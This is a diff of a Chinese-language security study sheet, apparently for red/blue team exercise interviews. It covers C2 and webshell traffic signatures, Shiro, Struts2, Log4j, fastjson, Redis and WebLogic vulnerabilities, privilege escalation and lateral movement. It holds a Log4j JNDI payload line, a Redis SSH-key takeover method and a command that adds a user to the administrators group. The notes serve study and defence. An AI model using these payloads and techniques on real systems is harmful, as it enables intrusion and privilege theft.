@@ -36,6 +36,7 @@
   + 2.0
     + 请求返回一个16位的key
     + accept q=.2
+    + 带有PHPSESSID
   + 3.0
     + 使用二进制协议
     + content-type一定为application/octet-stream
@@ -50,12 +51,10 @@
 + 哥斯拉
 
   + base64 异或或者AES，返回带有脏字符
-+ CS
-
-  + 50050
 + MSF
 
   + 4444
+  + *metepreter*
 + CS
 
   + http特征，get请求对url请求资源文件，取决于c2的profile的设置，请求头一般用base64加密后的
@@ -128,6 +127,7 @@
 + JBoss
 
   + 反序列化，war后门
+  + /invoker/readonl 返回500
 + WebLogic
 
   + 7001
@@ -138,22 +138,29 @@
     + S-收到回复 HELO ... HL:19
   + weblogic.rjvm.t3下的接口请求
   + 内存马：
-    + 成因：客户端通过T3协议反序列化漏洞远程绑定一个实例对象，绑定后使用lookup查找该实例调用，实现t3后门
-    + 措施：通过weblogic的jndi树判断是否被注入了t3协议后门
-+ struct
+    + **成因：客户端通过T3协议反序列化漏洞远程绑定一个实例对象，绑定后使用lookup查找该实例调用，实现t3后门**
+    + **措施：通过weblogic的jndi树判断是否被注入了t3协议后门**
++ struts2
 
-  + Content-Type的header头执行命令
-    + 045错误引用了ognl表达式
-    + 048封装action的时候有一步调用getstackvalue递归获取ognl表达式
-    + 016 *action redirect附带ognl表达式*
+  + **不合法的contenttype**
+  + **不合法的方法调用 action() method()**
+  + **045错误引用了ognl表达式**
+  + 048封装action的时候有一步调用getstackvalue递归获取ognl表达式
+  + 016 *action redirect附带ognl表达式*
 + shiro
 
+  + RememberMe=deleteMe
   + 550
     + 记住密码 RememberMe
     + 命令->序列化->AES->base64->cookie值
+    + AES固定密码本
   + 721
     + AES-128-CBC对cookie的RememberMe加密
-    + 通过
+    + padding oracle随机生成的加密
+  + 550是反序列化，721是padding oracle加密解密构造一个rememberme字段进行反序列化，550不需要rememberMe Cookie解密，721需要来remenberMe Cookie解密；
++ springboot
+
+  + ${},jndi,rmi,ldap字段作为关注目标
 
   ```sql
   Shiro550只需要通过碰撞key，爆破出来密钥，就可以进行利用
@@ -165,17 +172,22 @@
   + 处理日志时存在JNDI注入
   + payload:${jndi:ldap://127.0.0.1/exploit}
   + 解析发现是JNDI的扩展内容再进一步解析发现是LDAP协议的服务器查找key是exploit，当exploit是java恶意对象就可以造成RCE
-+ springboot
-+ **shrio**
-
-  + 分为550和721，550是反序列化，721是加密解密，550不需要rememberMe Cookie解密，721需要来remenberMe Cookie解密；
 + fastjson
 
-  + @type,rmi,ladp等字符
+  + @type处理json数据的时候未对内容验证造成json解析为java对象执行达到RCE，具体有,rmi,ladp等字符
++ ThinkPHP
+
+  + 5.0 rce,preg_replace /e 危险参数 第二个参数会造成RCE
++ Redis
+
+  + prot 6379
+  + 未授权访问 写自己的publickey到 /root/.ssh中的keys文件夹当中 导致的连接ssh
+  + RCE 4.x以上 新增模块功能 未授权的情况下加载恶意的.so文件造成RCE
 
 ## 挖矿
 
 + **如果从流量判断挖矿木马，需要确认是否有挖矿协议流量，常见的有开头jsonrpc、Stratum之类的协议流量。**
++ 一般都有公开的指纹
 
 ## 内存马
 
@@ -307,14 +319,17 @@
       + 如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用-t u
   + 组策略配置提权
   + 第三方应用漏洞提权
+  + 注册表提权，自启动项，屏幕保护，用户登陆初始化...
 + linux
 
-  + suid提权
+  + 脏牛漏洞提权
+  + suid提权，比如find
   + 计划任务提权 最经典的就是配合redis
   + mysql提权 UDF
   + docker提权
   + ssh密钥提权
   + 内核提权uname -a再 searchsploit
+  + sudoer提权
 
 ## sql
 
@@ -346,4 +361,44 @@
   + psexec wmic smbexec winrm
 + 不出网怎么办
   + webshell搭配reGeorg实现socks代理
-  +
+  + 
+
+## 绕过
+
++ XSS
++ ![1713765415180](image/hvv/1713765415180.png)
+
+## 端口
+
++ HTTP (80)：⽤于Web服务器上的常规HTTP流量。
+  HTTPS (443)：⽤于加密的Web服务器上的HTTPS流量。
+  FTP (21)：⽤于⽂件传输协议。
+  SSH (22)：⽤于安全远程shell访问。
+  MySQL (3306)：⽤于MySQL数据库的连接。
+  redis (6379)
+  Oracle (1521)
+  MongoDB (27017)
+  SQLServer (1433)
+  memcached (11211)
+
+## OWASP TOP10
+
++ sql注入
++ 失败的认证
++ 敏感信息泄露
++ XXE
++ 失败的访问控制
++ 安全配置错误
++ XSS
++ CSRF
++ 不足的日志监控
++ SSRF
+
+## 刁钻问题
+
++ 不出网
+  + webshell不出网， 使用reGeorg实现正向的socks代理，探测能出网的协议:dns ICMP
+  + shiro不出网，确定存在漏洞可以RCE，但不能反弹shell，使用回显漏洞检测，利用后可写webshell然后也用reGeorg实现正向代理
+  + fastjson不出网，大部分都是出网的，不出网的poc就两个，其中一个poc版本要求很限制，第二个也就只是利用连的本地执行，但是可以回显
+  + mysql UDF 原理，user define function的简称，mysql通过dll文件读取了用户自定义的函数，成功调用后启一个有管理员权限的shell 然后net localgroup administrators username /add 添加到管理员组，不过有现成的udf利用工具
+  + SSRF支持的协议，http https ftp dict file php gopher
